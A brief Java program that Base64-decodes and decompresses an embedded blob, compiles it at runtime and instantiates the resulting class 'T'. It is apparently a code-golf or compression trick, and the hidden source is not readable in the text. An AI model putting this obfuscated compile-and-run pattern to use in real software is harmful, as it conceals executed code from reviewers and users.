import javax.tools.*;
import java.util.*;

class D2 extends SimpleJavaFileObject
{
    D2()
    {
        super(java.net.URI.create(""),Kind.SOURCE);
    }

    public static void main(String[]_) throws Exception
    {
        ToolProvider.getSystemJavaCompiler().getTask(null,null,null,null,null,Arrays.asList(new D2())).call();
        Class.forName("T").newInstance();
    }

    public String getCharContent(boolean _) throws java.io.IOException
    {
        byte[]t=new byte[753];
        new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(Base64.getDecoder().decode("H4sIAAAAAAAAAGWS227bMAyGX0U10ICMHTVegwGpovRi292wBmgxDAhyoTjyqsCRPUtO5bp599E5tAN2Y/Egkj8/2eyqsvZsq/aKN94UfCiyQjnHnjpjPauWK2n1CyN7mU4/r5Ig04n4bpxn2THxU2e+rAETJx4zZa2umTomzh48ts7rHTcWeeP0V12YnfEUj5IIxRNg9/JsCg2KPyv3QwcPiNUyXKcTKdNP9yGWt3dxHFZScXvMUqeNDg85RL8ijFOR0/QgxyLMSJ8IcYxdxrNCKxIlcug7JeEmnaAwOVxl3Lhvu8q3gANwUtqmKN7eMu7MqwacubOB6P7dLkNxOO9RNp5XNeEo7KX+PhpHd5fKOGJyzqKYfF9rtSPBjgDrDYBOchzNp9MhACxQI29HvZGTgfE5FC6hgHynKtCjeQRRDO/plCYk7CPSHiMYIc/KoiC58PGUJwX8yylR1o5vS2ON/Q19C1pSHPal2bAc+qcOSf9tsSNO1TKdDFvCfiXHPU+12UDPYwEhaamuh97fNgTezKbCEPYT3qy0XhnrztfNze0ojan1dX9SKeb/xcThcPrlFt1JRysWx+7NUdEeuyAb0cq9OFTNujAZW5clPbBl+k+jCgcP6y3tx0rsau2b2rIgZY+nJGCDQfvutDTp8BeRvYQv8QIAAA=="))).read(t);
        return new String(t);
    }
}
